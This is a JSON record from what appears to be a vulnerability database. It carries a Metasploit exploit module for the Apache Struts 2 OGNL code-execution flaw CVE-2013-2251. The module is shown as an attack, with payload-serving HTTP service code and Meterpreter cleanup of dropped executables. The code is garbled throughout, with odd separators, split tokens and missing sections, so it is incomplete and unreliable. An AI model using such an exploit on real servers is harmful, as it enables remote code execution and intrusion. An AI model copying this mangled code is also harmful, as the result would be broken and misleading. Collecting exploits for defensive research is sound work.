{
    "text": "vul_name : Apache Struts 2 DefaultActionMapper Prefixes OGNL Code Execution ， vul_cve : CVE-2013-2251 ， vul_poc :  ，  # This file is part of the Metasploit Framework and may be subject to ，  # redistribution and commercial restrictions. Please see the Metasploit ，  # Framework web site for more information on licensing and terms of use. ， require 'msf/core' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : Remote : HttpServer ， include Msf : Exploit : EXE ， include Msf : Exploit : FileDropper ， super ( update_info ( info ,  ， 'Name' => 'Apache Struts 2 DefaultActionMapper Prefixes OGNL Code Execution' ,  ， 'Description' => %q{ ， The Struts 2 DefaultActionMapper supports a method for short-circuit navigation ， state changes by prefixing parameters with \"action : \" or \"redirect : \" , followed by ， a desired navigational target expression. This mechanism was intended to help with ， attaching navigational information to buttons within forms. ， In Struts 2 before 2.3.15.1 the information following \"action : \" , \"redirect : \" or ， \"redirectAction : \" is not properly sanitized. Since said information will be ， evaluated as OGNL expression against the value stack , this introduces the ， possibility to inject server side code. ， This module has been tested successfully on Struts 2.3.15 over Tomcat 7 , with ， Windows 2003 SP2 and Ubuntu 10.04 operating systems. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'Takeshi Terada' ,  # Vulnerability discovery ， 'sinn3r' ,  # Metasploit module ， 'juan vazquez' # Metasploit modules ，  ]  ,  ， ' ，  [  ，  [ 'CVE' , '2013-2251' ]  ,  ，  [ 'OSVDB' , '95405' ]  ,  ，  [ 'BID' , '61189' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'Platform' => [ 'win' , 'linux' ]  ,  ， 'Targets' => ，  [  ，  [ 'Automatic' , {} ]  ,  ，  [ 'Windows' ,  ， { ， 'Arch' => ARCH_X86 ,  ， 'Platform' => 'win' ， } ，  ]  ,  ，  [ 'Linux' ,  ， { ， 'Arch' => ARCH_X86 ,  ， 'Platform' => 'linux' ， } ，  ]  ，  ]  ,  ， 'DefaultOptions' => ， { ， 'WfsDelay' => 10 ， } ,  ， 'Stance' => Msf : Exploit : Stance : Aggressive ,  ， 'DisclosureDate' => 'Jul 2 2013' ,  ， 'DefaultTarget' => 0 )  ， register_options (  ，  [  ， Opt : RPORT ( 8080 )  ,  ， OptString.new ( 'TARGETURI' ,  [ true , 'Action URI' , '/struts2-blank/example/HelloWorld.action' ]  )  ,  ， OptInt.new ( 'HTTP_DELAY' ,  [ true , 'Time that the HTTP Server will wait for the payload request' , 60 ]  )  ,  ，  # It isn't OptPath becuase it's a * remote * path ， OptString.new ( \"WritableDir\" ,  [ true , \"A directory where we can write files ( only on Linux targets ) \" , \"/tmp\" ]  )  ，  ]  , self.class )  ， end ， session.core.use ( \"stdapi\" ) unless session.ext.aliases.include? ( \"stdapi\" )  ， end ，  @ dropped_files.delete_if do | file |  ， false unless file = ~ /\\.exe/ ， win_file = file.gsub ( \"/\" , \"\\\" )  ， begin ， wintemp = session.fs.file.expand_path ( \"%TEMP%\" )  ， win_file = \" # {wintemp}\\ # {win_file}\" ， session.shell_command_token ( %Q | attrib.exe -r \" # {win_file}\" |  )  ， session.fs.file.rm ( win_file )  ， print_good ( \"Deleted # {file}\" )  ， true ， rescue : Rex : Post : Meterpreter : RequestError ， print_error ( \"Failed to delete # {win_file}\" )  ， false ， end ， end ， end ， super ， end ， def start_http_service ，  # do not use SSL ， ssl_restore = true ， datastore [ 'SSL' ] = false ， end ， srv_host = Rex : Socket.source_address ( rhost )  ， srv_host = datastore [ 'SRVHOST' ]  ， end ， service_url = srv_host + ' : ' + datastore [ 'SRVPORT' ] .to_s ， print_status ( \" # {rhost} :  # {rport} - Starting up our web service on # {service_url} .\" )  ， start_service ( { ， 'Uri' => { ， 'Proc' => Proc.new { | cli , req |  ， on_request_uri ( cli , req )  ， } ,  ， 'Path' => '/' ， } ， } )  ， datastore [ 'SSL' ] = true if ssl_restore ， end ， def check ， uri = normalize_uri ( target_uri.path )  ， res = send_request_cgi ( { ， 'uri' => uri ,  ， 'method' => 'GET' ， } )  ， print_error ( \" # {rhost} :  # {rport} - Check needs a valid action , returning 200 , as TARGETURI\" ) ",
    "time": "2013.07.27"
}